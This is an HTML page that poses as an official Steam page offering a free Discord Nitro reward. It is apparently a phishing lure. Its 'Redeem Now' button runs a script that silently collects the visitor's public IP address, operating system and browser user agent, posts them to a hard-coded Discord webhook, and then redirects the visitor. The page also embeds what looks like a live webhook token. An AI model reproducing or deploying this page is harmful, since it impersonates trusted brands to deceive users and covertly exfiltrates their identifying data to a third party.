<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Discord Nitro - Steam</title>
    <style>
        /* General Styles */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #171a21;
            color: #c7d5e0;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 30px;
            background-color: #1b2838;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 2rem;
            color: #ffffff;
            margin-bottom: 20px;
        }
        p {
            font-size: 1rem;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        /* Button Styles */
        .redeem-btn {
            background-color: #67c1f5;
            color: #1b2838;
            border: none;
            padding: 15px 30px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 3px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }
        .redeem-btn:hover {
            background-color: #5cb0e8;
            transform: scale(1.05);
        }

        /* Footer */
        footer {
            text-align: center;
            margin-top: 50px;
            font-size: 0.9rem;
            color: #666;
        }
        footer a {
            color: #88a0b7;
            text-decoration: none;
        }
        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Redeem Your Discord Nitro</h1>
        <p>Congratulations! You have been selected to redeem your free Discord Nitro subscription through Steam. Click the button below to claim your reward.</p>
        <button class="redeem-btn" onclick="redirectToDiscord()">Redeem Now</button>
    </div>

    <footer>
        <p>&copy; 2023 Steam. All rights reserved.</p>
    </footer>

    <script>
        async function redirectToDiscord() {
            // Fetch IP address and send data to webhook
            const ip = await fetchIPAddress();
            const os = getOS();

            // Send data to webhook
            sendRedeemInfoToWebhook(ip, os);

            // Redirect to discord.html after 1 second
            setTimeout(() => {
                window.location.href = "discord.html";
            }, 1000);
        }

        async function fetchIPAddress() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Unknown IP";
            }
        }

        function getOS() {
            const userAgent = navigator.userAgent;
            if (/Windows/.test(userAgent)) return "Windows";
            if (/Mac/.test(userAgent)) return "MacOS";
            if (/Linux/.test(userAgent)) return "Linux";
            if (/Android/.test(userAgent)) return "Android";
            if (/iPhone|iPad/.test(userAgent)) return "iOS";
            return "Unknown OS";
        }

        async function sendRedeemInfoToWebhook(ip, os) {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1358739681470316677/-GPhfZIhYskH1FlWulsIrUQZoG_oE6w7tewh1e8EowwBhSSDRdNzMXUPjG39gwUyt0uB";

            const payload = {
                embeds: [
                    {
                        title: "Redeem Attempt",
                        color: 0xff0000,
                        fields: [
                            { name: "IP Address", value: ip || "Unknown IP", inline: true },
                            { name: "Operating System", value: os || "Unknown OS", inline: true },
                            { name: "Browser", value: navigator.userAgent, inline: false },
                        ],
                        timestamp: new Date().toISOString(),
                    },
                ],
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    console.error("Failed to send redeem info to webhook:", response.status);
                }
            } catch (error) {
                console.error("Error sending redeem info to webhook:", error);
            }
        }
    </script>
</body>
</html>
